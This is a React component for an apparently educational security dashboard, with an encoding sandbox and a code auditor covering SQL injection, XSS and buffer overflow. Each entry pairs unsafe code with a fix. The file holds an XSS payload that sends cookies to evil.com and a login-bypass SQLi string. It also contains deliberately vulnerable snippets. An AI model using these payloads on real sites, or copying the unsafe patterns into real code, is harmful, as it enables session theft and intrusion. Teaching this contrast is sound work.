import React, { useState } from 'react';
import { Terminal, ShieldAlert, Key, CheckCircle, Shield } from 'lucide-react';
import './CyberConsole.css';

export default function CyberConsole() {
  const [activeTab, setActiveTab] = useState('encoder');
  
  // Encoder States
  const [inputText, setInputText] = useState('Hello Secure World');
  const [cipherType, setCipherType] = useState('base64');

  // Auditor States
  const [selectedAudit, setSelectedAudit] = useState('sqli');

  // Cryptographic functions
  const performEncoding = () => {
    try {
      if (cipherType === 'base64') {
        return btoa(inputText);
      }
      if (cipherType === 'hex') {
        return inputText
          .split('')
          .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
          .join(' ');
      }
      if (cipherType === 'binary') {
        return inputText
          .split('')
          .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
          .join(' ');
      }
      if (cipherType === 'rot13') {
        return inputText.replace(/[a-zA-Z]/g, function (c) {
          return String.fromCharCode(
            (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26
          );
        });
      }
      return inputText;
    } catch (e) {
      return 'Error: Invalid characters for encoding standard.';
    }
  };

  const encodedOutput = performEncoding();

  // Audit vulnerability dataset
  const auditData = {
    sqli: {
      title: 'SQL Injection (SQLi)',
      severity: 'Critical',
      exploit: 'A hacker inputs \' OR \'1\'=\'1 into the username field, causing the query database parser to authenticate the session without credentials.',
      unsafe: `// Unsafe dynamic query assembly\nconst query = "SELECT * FROM admin WHERE user = '" + input + "' AND pass = '" + password + "'";\ndb.execute(query);`,
      secure: `// Secure parameterized prepared statements\nconst query = "SELECT * FROM admin WHERE user = ? AND pass = ?";\ndb.execute(query, [input, password]);`,
      mitigation: 'Prepared statements isolate database parse compilation logic from dynamic string evaluations, neutralizing user input vectors.'
    },
    xss: {
      title: 'Cross-Site Scripting (XSS)',
      severity: 'High',
      exploit: 'Attackers inject `<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>` leading to credential hijacking.',
      unsafe: `// Vulnerable to markup execution\ndocument.getElementById('user-profile').innerHTML = \n  "<div>Bio: " + userBio + "</div>";`,
      secure: `// Safely binding raw string text nodes\nconst container = document.createElement('div');\ncontainer.textContent = "Bio: " + userBio;\ndocument.getElementById('user-profile').appendChild(container);`,
      mitigation: 'Substituting innerHTML with textContent escapes tag characters and forces the browser rendering context to interpret input as text nodes.'
    },
    buffer: {
      title: 'Memory Buffer Overflow',
      severity: 'High (GATE CS Focus)',
      exploit: 'Passing strings exceeding the array threshold overwrites stack register bounds, modifying the EIP return pointer to run shellcode.',
      unsafe: `/* Vulnerable unbounded copy in C */\nvoid register_user(char *input) {\n    char username[16];\n    strcpy(username, input); // No check\n}`,
      secure: `/* Safe bounded buffer operations */\nvoid register_user(char *input) {\n    char username[16];\n    strncpy(username, input, sizeof(username) - 1);\n    username[15] = '\\0'; // Safe bound\n}`,
      mitigation: 'Enforcing strict buffer boundary checks (strncpy/strlcpy) shields computer registers from stack corruption and malicious code execution.'
    }
  };

  const currentAudit = auditData[selectedAudit];

  return (
    <div className="cyber-console-container glass-panel">
      {/* Console Window Header */}
      <div className="console-window-bar">
        <div className="window-dots">
          <span className="dot dot-red"></span>
          <span className="dot dot-yellow"></span>
          <span className="dot dot-green"></span>
        </div>
        <div className="console-bar-title">
          <Terminal size={14} className="console-title-icon" />
          <span>sec-developer@dashboard: ~</span>
        </div>
        <div className="system-status-badge">
          <span className="pulse-green-dot"></span>
          SYSTEM SECURE
        </div>
      </div>

      {/* Mode Select Tabs */}
      <div className="console-tabs">
        <button
          className={`console-tab-btn ${activeTab === 'encoder' ? 'active' : ''}`}
          onClick={() => setActiveTab('encoder')}
        >
          <Key size={16} /> Cipher Sandbox
        </button>
        <button
          className={`console-tab-btn ${activeTab === 'auditor' ? 'active' : ''}`}
          onClick={() => setActiveTab('auditor')}
        >
          <ShieldAlert size={16} /> Code Auditor
        </button>
      </div>

      {/* Tab Panels */}
      <div className="console-screen font-mono">
        {activeTab === 'encoder' ? (
          <div className="encoder-panel">
            <div className="console-terminal-lines">
              <span className="terminal-prompt">$</span> cat cipher_sandbox.conf
              <p className="terminal-output-text">Select algorithm format and perform raw conversions on critical packets.</p>
            </div>

            <div className="encoder-grid">
              <div className="input-group-console">
                <label className="console-label">RAW STRING INPUT</label>
                <textarea
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  placeholder="Enter message here..."
                  className="console-textarea"
                  rows={4}
                />
              </div>

              <div className="cipher-selector-group">
                <label className="console-label">ALGORITHM SELECTION</label>
                <div className="cipher-options">
                  {[
                    { id: 'base64', name: 'Base64' },
                    { id: 'hex', name: 'HEX representation' },
                    { id: 'binary', name: 'Binary stream' },
                    { id: 'rot13', name: 'ROT13 obfuscation' }
                  ].map(opt => (
                    <button
                      key={opt.id}
                      className={`cipher-opt-btn ${cipherType === opt.id ? 'active' : ''}`}
                      onClick={() => setCipherType(opt.id)}
                    >
                      {opt.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="output-group-console">
              <label className="console-label">ENCODED PAYLOAD OUTPUT</label>
              <div className="console-output-box">
                <code>{encodedOutput}</code>
              </div>
            </div>
          </div>
        ) : (
          <div className="auditor-panel">
            <div className="console-terminal-lines">
              <span className="terminal-prompt">$</span> ./audit_code_vulnerabilities.sh
              <p className="terminal-output-text">Analyze architectural vulnerability exploits and apply secure patches.</p>
            </div>

            <div className="auditor-controls">
              {Object.keys(auditData).map(key => (
                <button
                  key={key}
                  className={`audit-selector-btn ${selectedAudit === key ? 'active' : ''}`}
                  onClick={() => setSelectedAudit(key)}
                >
                  {auditData[key].title}
                </button>
              ))}
            </div>

            <div className="audit-details-grid">
              <div className="audit-meta">
                <div className="meta-row">
                  <span className="meta-label">VULNERABILITY:</span>
                  <span className="meta-val text-alert font-bold">{currentAudit.title}</span>
                </div>
                <div className="meta-row">
                  <span className="meta-label">SEVERITY LEVEL:</span>
                  <span className="meta-val badge-severity">{currentAudit.severity}</span>
                </div>
                <div className="exploit-description">
                  <strong>Vector Exploit Vector:</strong> {currentAudit.exploit}
                </div>
              </div>

              <div className="audit-code-blocks">
                <div className="code-block-wrapper unsafe">
                  <div className="code-block-header">
                    <ShieldAlert size={14} /> UNSAFE CODE BLOCK
                  </div>
                  <pre><code>{currentAudit.unsafe}</code></pre>
                </div>

                <div className="code-block-wrapper secure">
                  <div className="code-block-header">
                    <CheckCircle size={14} /> SECURED PATCH
                  </div>
                  <pre><code>{currentAudit.secure}</code></pre>
                </div>
              </div>

              <div className="audit-mitigation-box">
                <Shield size={16} className="mitigation-icon" />
                <p><strong>Remediation:</strong> {currentAudit.mitigation}</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
